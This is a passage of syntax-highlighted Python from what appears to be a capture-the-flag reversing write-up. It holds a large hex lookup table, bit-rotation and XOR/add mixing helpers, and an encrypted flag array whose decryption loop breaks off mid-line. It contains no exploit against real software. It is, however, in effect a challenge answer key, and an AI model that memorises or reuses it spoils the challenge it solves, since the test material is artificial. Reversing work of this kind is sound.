class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0xA0</span>, <span class="number">0xD8</span>, <span class="number">0x88</span>, <span class="number">0x6F</span>, <span class="number">0xAB</span>, <span class="number">0x8E</span>, <span class="number">0x6F</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0xA7</span>, <span class="number">0x23</span>, <span class="number">0xAE</span>, <span class="number">0xC5</span>, <span class="number">0x78</span>, <span class="number">0xAE</span>, <span class="number">0xD2</span>, <span class="number">0xE8</span>, <span class="number">0xA6</span>, <span class="number">0xD2</span>, <span class="number">0x1C</span>, <span class="number">0x8A</span>, <span class="number">0x59</span>, <span class="number">0x1C</span>, <span class="number">0xC5</span>, <span class="number">0x23</span>, <span class="number">0x60</span>, <span class="number">0xC5</span>, <span class="number">0x1E</span>, <span class="number">0x18</span>, <span class="number">0x12</span>, <span class="number">0x1E</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0x46</span>, <span class="number">0x72</span>, <span class="number">0x2C</span>, <span class="number">0x6D</span>, <span class="number">0xAE</span>, <span class="number">0x2C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0xDC</span>, <span class="number">0xAD</span>, <span class="number">0x3E</span>, <span class="number">0xDC</span>, <span class="number">0xF8</span>, <span class="number">0x5A</span>, <span class="number">0xD5</span>, <span class="number">0xF8</span>, <span class="number">0x75</span>, <span class="number">0xFE</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0x09</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, <span class="number">0xD3</span>, <span class="number">0xA1</span>, <span class="number">0x37</span>, <span class="number">0xD3</span>, <span class="number">0x6A</span>, <span class="number">0xAF</span>, <span class="number">0x89</span>, <span class="number">0x6A</span>, <span class="number">0x42</span>, <span class="number">0x8F</span>, <span class="number">0xB1</span>, <span class="number">0x42</span>, <span class="number">0x04</span>, <span class="number">0x4D</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0xED</span>, <span class="number">0x4E</span>, <span class="number">0x8C</span>, <span class="number">0xC3</span>, <span class="number">0xFC</span>, <span class="number">0xBD</span>, <span class="number">0xC3</span>, <span class="number">0xDA</span>, <span class="number">0x72</span>, <span class="number">0xE3</span>, <span class="number">0xDA</span>, <span class="number">0x3A</span>, <span class="number">0xEF</span>, <span class="number">0xF9</span>, <span class="number">0x3A</span>, <span class="number">0x37</span>, <span class="number">0x71</span>, <span class="number">0xBB</span>, <span class="number">0x37</span>, <span class="number">0x8A</span>, <span class="number">0x32</span>, <span class="number">0x93</span>, <span class="number">0x8A</span>, <span class="number">0xFE</span>, <span class="number">0x85</span>, <span class="number">0x08</span>, <span class="number">0xFE</span>, <span class="number">0xC2</span>, <span class="number">0xB5</span>, <span class="number">0x2C</span>, <span class="number">0xC2</span>, <span class="number">0x15</span>, <span class="number">0x59</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x30</span>, <span class="number">0xE7</span>, <span class="number">0xF7</span>, <span class="number">0x30</span>, <span class="number">0xCB</span>, <span class="number">0x66</span>, <span class="number">0xF8</span>, <span class="number">0xCB</span>, <span class="number">0x74</span>, <span class="number">0xB7</span>, <span class="number">0x9B</span>, <span class="number">0x74</span>, <span class="number">0x9E</span>, <span class="number">0x22</span>, <span class="number">0x8F</span>, <span class="number">0x9E</span>, <span class="number">0x66</span>, <span class="number">0x78</span>, <span class="number">0x5A</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x39</span>, <span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x15</span>, <span class="number">0x1B</span>, <span class="number">0xEC</span>, <span class="number">0x4A</span>, <span class="number">0xC9</span>, <span class="number">0xEC</span>, <span class="number">0x29</span>, <span class="number">0x69</span>, <span class="number">0xA9</span>, <span class="number">0x29</span>, <span class="number">0xF2</span>, <span class="number">0x52</span>, <span class="number">0xDB</span>, <span class="number">0xF2</span>, <span class="number">0x22</span>, <span class="number">0x28</span>, <span class="number">0x36</span>, <span class="number">0x22</span>, <span class="number">0x31</span>, <span class="number">0xAE</span>, <span class="number">0x66</span>, <span class="number">0x31</span>, <span class="number">0xF4</span>, <span class="number">0x8D</span>, <span class="number">0x06</span>, <span class="number">0xF4</span>, <span class="number">0x85</span>, <span class="number">0x3E</span>, <span class="number">0x9A</span>, <span class="number">0x85</span>, <span class="number">0x47</span>, <span class="number">0x8B</span>, <span class="number">0xB6</span>, <span class="number">0x47</span>, <span class="number">0x7E</span>, <span class="number">0xBF</span>, <span class="number">0x95</span>, <span class="number">0x7E</span>, <span class="number">0x4F</span>, <span class="number">0x11</span>, <span class="number">0xF3</span>, <span class="number">0x4F</span>, <span class="number">0xED</span>, <span class="number">0x03</span>, <span class="number">0x58</span>, <span class="number">0xED</span>, <span class="number">0xE5</span>, <span class="number">0x99</span>, <span class="number">0x1D</span>, <span class="number">0xE5</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0xFD</span>, <span class="number">0x45</span>, <span class="number">0x92</span>, <span class="number">0xF5</span>, <span class="number">0x5C</span>, <span class="number">0x92</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0x34</span>, <span class="number">0xAA</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x14</span>, <span class="number">0x10</span>, <span class="number">0x1C</span>, <span class="number">0x14</span>, <span class="number">0x35</span>, <span class="number">0xE3</span>, <span class="number">0xF0</span>, <span class="number">0x35</span>, <span class="number">0xAF</span>, <span class="number">0x8C</span>, <span class="number">0xE9</span>, <span class="number">0xAF</span>, <span class="number">0x08</span>, <span class="number">0x9A</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x27</span>, <span class="number">0x2C</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x2E</span>, <span class="number">0xFF</span>, <span class="number">0xE5</span>, <span class="number">0x2E</span>, <span class="number">0xEF</span>, <span class="number">0x91</span>, <span class="number">0x13</span>, <span class="number">0xEF</span>, <span class="number">0x77</span>, <span class="number">0x6C</span>, <span class="number">0x41</span>, <span class="number">0x77</span>, <span class="number">0xA8</span>, <span class="number">0x1A</span>, <span class="number">0xA5</span>, <span class="number">0xA8</span>, <span class="number">0xD4</span>, <span class="number">0x37</span>, <span class="number">0x7B</span>, <span class="number">0xD4</span>, <span class="number">0x0D</span>, <span class="number">0x9E</span>, <span class="number">0x42</span>, <span class="number">0x0D</span>, <span class="number">0xAC</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0xAC</span>, <span class="number">0xDB</span>, <span class="number">0x3B</span>, <span class="number">0x72</span>, <span class="number">0xDB</span>, <span class="number">0xBD</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0xBD</span>, <span class="number">0x80</span>, <span class="number">0x3A</span>, <span class="number">0x9D</span>, <span class="number">0x80</span>, <span class="number">0x65</span>, <span class="number">0xA3</span>, <span class="number">0x80</span>, <span class="number">0x65</span>, <span class="number">0x0E</span>, <span class="number">0x45</span>, <span class="number">0x98</span>, <span class="number">0x0E</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, <span class="number">0x0C</span>, <span class="number">0x81</span>, <span class="number">0xB8</span>, <span class="number">0x47</span>, <span class="number">0x2F</span>, <span class="number">0xB8</span>, <span class="number">0x7C</span>, <span class="number">0x2D</span>, <span class="number">0xDE</span>, <span class="number">0x7C</span>, <span class="number">0xDD</span>, <span class="number">0xE4</span>, <span class="number">0xAF</span>, <span class="number">0xDD</span>, <span class="number">0x79</span>, <span class="number">0x29</span>, <span class="number">0xD9</span>, <span class="number">0x79</span>, <span class="number">0xFC</span>, <span class="number">0x17</span>, <span class="number">0x43</span>, <span class="number">0xFC</span>, <span class="number">0x86</span>, <span class="number">0xE5</span>, <span class="number">0x40</span>, <span class="number">0x86</span>, <span class="number">0x64</span>, <span class="number">0xEA</span>, <span class="number">0x11</span>, <span class="number">0x64</span>, <span class="number">0x8B</span>, <span class="number">0x7B</span>, <span class="number">0x02</span>, <span class="number">0x8B</span>, <span class="number">0x8F</span>, <span class="number">0x36</span>, <span class="number">0x94</span>, <span class="number">0x8F</span>, <span class="number">0xE2</span>, <span class="number">0x0F</span>, <span class="number">0x51</span>, <span class="number">0xE2</span>, <span class="number">0x6B</span>, <span class="number">0xE6</span>, <span class="number">0x18</span>, <span class="number">0x6B</span>, <span class="number">0x2A</span>, <span class="number">0xB2</span>, <span class="number">0x73</span>, <span class="number">0x2A</span>, <span class="number">0x12</span>, <span class="number">0xCF</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xA0</span>, <span class="number">0x80</span>, <span class="number">0xE0</span>, <span class="number">0xA0</span>, <span class="number">0xDF</span>, <span class="number">0x76</span>, <span class="number">0xE4</span>, <span class="number">0xDF</span>, <span class="number">0x5F</span>, <span class="number">0x4C</span>, <span class="number">0x79</span>, <span class="number">0x5F</span>, <span class="number">0x99</span>, <span class="number">0xB4</span>, <span class="number">0xC3</span>, <span class="number">0x99</span>, <span class="number">0xA5</span>, <span class="number">0x84</span>, <span class="number">0xE7</span>, <span class="number">0xA5</span>, <span class="number">0x49</span>, <span class="number">0xCE</span>, <span class="number">0x2E</span>, <span class="number">0x49</span>, <span class="number">0xF9</span>, <span class="number">0x13</span>, <span class="number">0x44</span>, <span class="number">0xF9</span>, <span class="number">0xD7</span>, <span class="number">0xEC</span>, <span class="number">0xA1</span>, <span class="number">0xD7</span>, <span class="number">0xE7</span>, <span class="number">0x0B</span>, <span class="number">0x56</span>, <span class="number">0xE7</span>, <span class="number">0xA4</span>, <span class="number">0xCD</span>, <span class="number">0x76</span>, <span class="number">0xA4</span>, <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x5D</span>, <span class="number">0x63</span>, <span class="number">0x25</span>, <span class="number">0xBE</span>, <span class="number">0x7A</span>, <span class="number">0x25</span>, <span class="number">0xF3</span>, <span class="number">0x1B</span>, <span class="number">0x4A</span>, <span class="number">0xF3</span>, <span class="number">0x67</span>, <span class="number">0x31</span>, <span class="number">0xCB</span>, <span class="number">0x67</span>, <span class="number">0xEE</span>, <span class="number">0xD8</span>, <span class="number">0x82</span>, <span class="number">0xEE</span>, <span class="number">0xA6</span>, <span class="number">0x5F</span>, <span class="number">0x3D</span>, <span class="number">0xA6</span>, <span class="number">0xC7</span>, <span class="number">0xB1</span>, <span class="number">0x2B</span>, <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0x27</span>, <span class="number">0x67</span>, <span class="number">0xC0</span>, <span class="number">0x07</span>, <span class="number">0x96</span>, <span class="number">0x4C</span>, <span class="number">0x07</span>, <span class="number">0x6E</span>, <span class="number">0xE2</span>, <span class="number">0x1F</span>, <span class="number">0x6E</span>, <span class="number">0xAA</span>, <span class="number">0x88</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xCD</span>, <span class="number">0xB9</span>, <span class="number">0x25</span>, <span class="number">0xCD</span>, <span class="number">0x61</span>, <span class="number">0xEE</span>, <span class="number">0x16</span>, <span class="number">0x61</span>, <span class="number">0x0C</span>, <span class="number">0xD7</span>, <span class="number">0xD3</span>, <span class="number">0x0C</span>, <span class="number">0xB5</span>, <span class="number">0xD9</span>, <span class="number">0x6D</span>, <span class="number">0xB5</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0xE6</span>, <span class="number">0x54</span>, <span class="number">0x1D</span>, <span class="number">0xC3</span>, <span class="number">0xC8</span>, <span class="number">0x1D</span>, <span class="number">0x93</span>, <span class="number">0xBC</span>, <span class="number">0xCD</span>, <span class="number">0x93</span>, <span class="number">0x43</span>, <span class="number">0xC6</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0xCE</span>, <span class="number">0x62</span>, <span class="number">0xFF</span>, <span class="number">0xCE</span>, <span class="number">0x71</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0x71</span>, <span class="number">0x57</span>, <span class="number">0xD6</span>, <span class="number">0x3C</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x5C</span>, <span class="number">0x65</span>, <span class="number">0x4B</span>, <span class="number">0xB6</span>, <span class="number">0x02</span>, <span class="number">0xB7</span>, <span class="number">0xB6</span>, <span class="number">0x95</span>, <span class="number">0x63</span>, <span class="number">0x10</span>, <span class="number">0x95</span>, <span class="number">0x60</span>, <span class="number">0xA7</span>, <span class="number">0x87</span>, <span class="number">0x60</span>, <span class="number">0x58</span>, <span class="number">0xDA</span>, <span class="number">0x35</span>, <span class="number">0x58</span>, <span class="number">0x82</span>, <span class="number">0xA8</span>, <span class="number">0xD6</span>, <span class="number">0x82</span>, <span class="number">0xEA</span>, <span class="number">0x95</span>, <span class="number">0x14</span>, <span class="number">0xEA</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0x84</span>, <span class="number">0x1A</span>, <span class="number">0xFB</span>, <span class="number">0x81</span>, <span class="number">0x0F</span>, <span class="number">0xFB</span>, <span class="number">0x56</span>, <span class="number">0x9F</span>, <span class="number">0xAD</span>, <span class="number">0x56</span>, <span class="number">0xE0</span>, <span class="number">0x9D</span>, <span class="number">0x1A</span>, <span class="number">0xE0</span>, <span class="number">0x3E</span>, <span class="number">0xA2</span>, <span class="number">0x6F</span>, <span class="number">0x3E</span>, <span class="number">0x06</span>, <span class="number">0xDF</span>, <span class="number">0xDD</span>, <span class="number">0x06</span>, <span class="number">0x89</span>, <span class="number">0xE9</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0x24</span>, <span class="number">0xF7</span>, <span class="number">0xEB</span>, <span class="number">0x24</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x03</span>, <span class="number">0x7A</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x6B</span>, <span class="number">0x41</span>, <span class="number">0xE3</span>, <span class="number">0x46</span>, <span class="number">0xC0</span>, <span class="number">0xE3</span>, <span class="number">0x91</span>, <span class="number">0x2E</span>, <span class="number">0x86</span>, <span class="number">0x91</span>, <span class="number">0x28</span>, <span class="number">0x20</span>, <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="number">0x9D</span>, <span class="number">0xF9</span>, <span class="number">0x55</span>, <span class="number">0x9D</span>, <span class="number">0xD5</span>, <span class="number">0x7E</span>, <span class="number">0xEA</span>, <span class="number">0xD5</span>, <span class="number">0x46</span>, <span class="number">0xC2</span>, <span class="number">0x27</span>, <span class="number">0x46</span>, <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x54</span>, <span class="number">0x6C</span>, <span class="number">0x21</span>, <span class="number">0xF3</span>, <span class="number">0xEC</span>, <span class="number">0x21</span>, <span class="number">0x50</span>, <span class="number">0x40</span>, <span class="number">0x70</span>, <span class="number">0x50</span>, <span class="number">0x5A</span>, <span class="number">0x48</span>, <span class="number">0x7E</span>, <span class="number">0x5A</span>, <span class="number">0xDE</span>, <span class="number">0x3F</span>, <span class="number">0x75</span>, <span class="number">0xDE</span>, <span class="number">0x26</span>, <span class="number">0x65</span>, <span class="number">0xA0</span>, <span class="number">0x26</span>, <span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xBF</span>, <span class="number">0x48</span>, <span class="number">0xB2</span>, <span class="number">0x4F</span>, <span class="number">0x21</span>, <span class="number">0xB2</span>, <span class="number">0xD0</span>, <span class="number">0x7A</span>, <span class="number">0xED</span>, <span class="number">0xD0</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x2A</span>, <span class="number">0x36</span>, <span class="number">0xAB</span>, <span class="number">0xC1</span>, <span class="number">0x7F</span>, <span class="number">0xAB</span>, <span class="number">0xBF</span>, <span class="number">0xD1</span>, <span class="number">0x63</span>, <span class="number">0xBF</span>, <span class="number">0xA9</span>, <span class="number">0x53</span>, <span class="number">0x34</span>, <span class="number">0xA9</span>, <span class="number">0x5E</span>, <span class="number">0x05</span>, <span class="number">0xE8</span>, <span class="number">0x5E</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0xBC</span>, <span class="number">0x32</span>, <span class="number">0x01</span>, <span class="number">0x49</span>, <span class="number">0x91</span>, <span class="number">0x01</span>, <span class="number">0x3F</span>, <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x3F</span>, <span class="number">0x55</span>, <span class="number">0x44</span>, <span class="number">0x77</span>, <span class="number">0x55</span>, <span class="number">0x38</span>, <span class="number">0x7D</span>, <span class="number">0xB2</span>, <span class="number">0x38</span>, <span class="number">0xC6</span>, <span class="number">0xF8</span>, <span class="number">0xBA</span>, <span class="number">0xC6</span>, <span class="number">0xFF</span>, <span class="number">0xCC</span>, <span class="number">0x99</span>, <span class="number">0xFF</span>, <span class="number">0xAD</span>, <span class="number">0x1E</span>, <span class="number">0xA2</span>, <span class="number">0xAD</span>, <span class="number">0x5C</span>, <span class="number">0x97</span>, <span class="number">0xA3</span>, <span class="number">0x5C</span>, <span class="number">0x02</span>, <span class="number">0x92</span>, <span class="number">0x4B</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0xD0</span>, <span class="number">0x76</span>, <span class="number">0xA2</span>, <span class="number">0x12</span>, <span class="number">0xAB</span>, <span class="number">0xA2</span>, <span class="number">0xE8</span>, <span class="number">0x07</span>, <span class="number">0x5F</span>, <span class="number">0xE8</span>, <span class="number">0x3B</span>, <span class="number">0xA6</span>, <span class="number">0x68</span>, <span class="number">0x3B</span>, <span class="number">0xB4</span>, <span class="number">0x90</span>, <span class="number">0xFC</span>, <span class="number">0xB4</span>, <span class="number">0xF1</span>, <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xF1</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0xCF</span>, <span class="number">0x2B</span>, <span class="number">0x6E</span>, <span class="number">0xCF</span>, <span class="number">0x70</span>, <span class="number">0xFA</span>, <span class="number">0x0D</span>, <span class="number">0x70</span>, <span class="number">0xD6</span>, <span class="number">0xA5</span>, <span class="number">0x30</span>, <span class="number">0xD6</span>, <span class="number">0x7D</span>, <span class="number">0x64</span>, <span class="number">0x4F</span>, <span class="number">0x7D</span>, <span class="number">0x0B</span>, <span class="number">0x41</span>, <span class="number">0x9F</span>, <span class="number">0x0B</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0xA4</span>, <span class="number">0x59</span>, <span class="number">0xEB</span>, <span class="number">0xDC</span>, <span class="number">0x85</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0xDB</span>, <span class="number">0xDA</span>, <span class="number">0x03</span>, <span class="number">0x3D</span>, <span class="number">0x79</span>, <span class="number">0xB5</span>, <span class="number">0x3D</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x6C</span>, <span class="number">0x44</span>, <span class="number">0x4A</span>, <span class="number">0x15</span>, <span class="number">0xF4</span>, <span class="number">0x4A</span>, <span class="number">0xF7</span>, <span class="number">0x56</span>, <span class="number">0xDC</span>, <span class="number">0xF7</span>, <span class="number">0x6D</span>, <span class="number">0x39</span>, <span class="number">0xC5</span>, <span class="number">0x6D</span>, <span class="number">0x7B</span>, <span class="number">0xBB</span>, <span class="number">0x92</span>, <span class="number">0x7B</span>, <span class="number">0x52</span>, <span class="number">0xD2</span>, <span class="number">0x3B</span>, <span class="number">0x52</span>, <span class="number">0x9F</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x9F</span>, <span class="number">0x8E</span>, <span class="number">0x7F</span>, <span class="number">0x05</span>, <span class="number">0x8E</span>, <span class="number">0x98</span>, <span class="number">0xFD</span>, <span class="number">0x52</span>, <span class="number">0x98</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x53</span>, <span class="number">0x69</span>, <span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xB9</span>, <span class="number">0xBC</span>, <span class="number">0x33</span>, <span class="number">0x3C</span>, <span class="number">0x2D</span>, <span class="number">0x33</span>, <span class="number">0xBA</span>, <span class="number">0xD5</span>, <span class="number">0x64</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x78</span>, <span class="number">0xB9</span>, <span class="number">0x0E</span>, <span class="number">0xBE</span>, <span class="number">0xB9</span>, <span class="number">0xA3</span>, <span class="number">0x5B</span>, <span class="number">0x3A</span>, <span class="number">0xA3</span>, <span class="number">0x3C</span>, <span class="number">0x30</span>, <span class="number">0x24</span>, <span class="number">0x3C</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>, <span class="number">0x96</span>, <span class="number">0xB8</span>, <span class="number">0xCA</span>, <span class="number">0x96</span>, <span class="number">0xA1</span>, <span class="number">0xC9</span>, <span class="number">0x71</span>, <span class="number">0xA1</span>, <span class="number">0xBE</span>, <span class="number">0x98</span>, <span class="number">0xF2</span>, <span class="number">0xBE</span>, <span class="number">0xCA</span>, <span class="number">0x2F</span>, <span class="number">0x69</span>, <span class="number">0xCA</span>, <span class="number">0x2F</span>, <span class="number">0xB6</span>, <span class="number">0x74</span>, <span class="number">0x2F</span>, <span class="number">0x90</span>, <span class="number">0x67</span>, <span class="number">0x17</span>, <span class="number">0x90</span>, <span class="number">0xC4</span>, <span class="number">0x6A</span>, <span class="number">0xF1</span>, <span class="number">0xC4</span>, <span class="number">0xCC</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xFA</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xFA</span>, <span class="number">0x10</span>, <span class="number">0x5D</span>, <span class="number">0x8A</span>, <span class="number">0x10</span>, <span class="number">0x9C</span>, <span class="number">0xB0</span>, <span class="number">0xC4</span>, <span class="number">0x9C</span>, <span class="number">0xE9</span>, <span class="number">0x4E</span>, <span class="number">0xCE</span>, <span class="number">0xE9</span>, <span class="number">0x9B</span>, <span class="number">0x26</span>, <span class="number">0x88</span>, <span class="number">0x9B</span>, <span class="number">0x9A</span>, <span class="number">0x6F</span>, <span class="number">0x19</span>, <span class="number">0x9A</span>, <span class="number">0x13</span>, <span class="number">0x86</span>, <span class="number">0x50</span>, <span class="number">0x13</span>, <span class="number">0x4E</span>, <span class="number">0x58</span>, <span class="number">0x62</span>, <span class="number">0x4E</span>, <span class="number">0xA7</span>, <span class="number">0x16</span>, <span class="number">0xAC</span>, <span class="number">0xA7</span>, <span class="number">0x16</span>, <span class="number">0x82</span>, <span class="number">0x57</span>, <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x06</span>, <span class="number">0xB0</span>, <span class="number">0xB3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate left: 0b1001 --&gt; 0b0011</span></span><br><span class="line">rol = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits % max_bits) &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>)) &gt;&gt; (max_bits - (r_bits % max_bits)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rotate right: 0b1001 --&gt; 0b1100</span></span><br><span class="line">ror = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>)) &gt;&gt; r_bits % max_bits) | \</span><br><span class="line">    (val &lt;&lt; (max_bits - (r_bits % max_bits)) &amp; (<span class="number">2</span>**max_bits - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access_offstream</span><span class="params">(offset, index)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> array_of_ints_to_int(offset[index:index + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">array_of_ints_to_int</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">''</span>.join(pack(<span class="string">'!B'</span>, x) <span class="keyword">for</span> x <span class="keyword">in</span> a).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shr_add_xor</span><span class="params">(dword, offset, shifts, adds=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], muls=[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span>:</span></span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">0</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">0</span>]) * muls[<span class="number">0</span>]</span><br><span class="line">    a = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">1</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">1</span>]) * muls[<span class="number">1</span>]</span><br><span class="line">    b = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">    c = a ^ b</span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">2</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">2</span>]) * muls[<span class="number">2</span>]</span><br><span class="line">    d = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">    e = d ^ c</span><br><span class="line"></span><br><span class="line">    edx = ((dword &gt;&gt; shifts[<span class="number">3</span>] &amp; <span class="number">0xff</span>) + adds[<span class="number">3</span>]) * muls[<span class="number">3</span>]</span><br><span class="line">    f = array_of_ints_to_int(offset[edx:edx + <span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">    g = f ^ e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a, b, c, d, f, g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_sum_xor</span><span class="params">(dword0, dword1, dword3, offset, offset_index)</span>:</span></span><br><span class="line">    sum1 = (dword0 + dword1) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    sum2 = (</span><br><span class="line">        sum1 + array_of_ints_to_int(offset[offset_index:offset_index + <span class="number">4</span>][::<span class="number">-1</span>])) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> sum2 ^ dword3</span><br><span class="line"></span><br><span class="line">encrypted_flag = [<span class="number">0x4F</span>, <span class="number">0x6F</span>, <span class="number">0xA7</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0x51</span>, <span class="number">0x87</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x2A</span>,</span><br><span class="line">                  <span class="number">0x46</span>, <span class="number">0xE5</span>, <span class="number">0x4F</span>, <span class="number">0x21</span>, <span class="number">0x9E</span>, <span class="number">0x1C</span>, <span class="number">0xCD</span>, <span class="number">0x65</span>, <span class="number">0xE1</span>, <span class="number">0x9A</span>,</span><br><span class="line">                  <span class="number">0x4F</span>, <span class="number">0xCF</span>, <span class="number">0xDE</span>, <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0xBF</span>, <span class="number">0x53</span>, <span class="number">0xC4</span>, <span class="number">0xB0</span>, <span class="number">0x95</span>,</span><br><span class="line">                  <span class="number">0x75</span>, <span class="number">0x31</span>, <span class="number">0xAC</span>, <span class="number">0x2F</span>, <span class="number">0xF4</span>, <span class="number">0x97</span>, <span class="number">0x1D</span>, <span class="number">0xA5</span>, <span class="number">0x9A</span>, <span class="number">0x02</span>,</span><br><span class="line">                  <span class="number">0xA8</span>, <span class="number">0xFF</span>, <span class="number">0xAE</span>, <span class="number">0x2E</span>, <span class="number">0xB9</span>, <span class="number">0x70</span>, <span class="number">0xCC</span>, <span class="number">0x02</span>]</span><br><span class="line"></span><br><span class="line">xor_keys_input0 = [<span class="number">0</span>] * <span class="number">0x8</span></span><br><span class="line">xor_keys_input1 = [<span class="number">0</span>] * <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(encrypted_flag)):</span><br><span class="line">    <span class="keyword">if</span> (x % <span class="number">16</span>) &lt; <span class="number">8</span>:</span><br><span class="line">        xor_keys_input0.append(encrypted_flag[x])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        xor_keys_input1.append(encrypted_flag[x])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span> * <span class="number">3</span>, <span class="number">16</span>):</span><br><span class="line"></span><br><span class="line">    test = encrypted_flag[x:<span class="number">16</span> + x]</span><br><span class="line"></span><br><span class="line">    dword_560CC63C71B0 = test[:<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">    dword_560CC63C71B8 = test[<span class="number">8</span>:][::<span 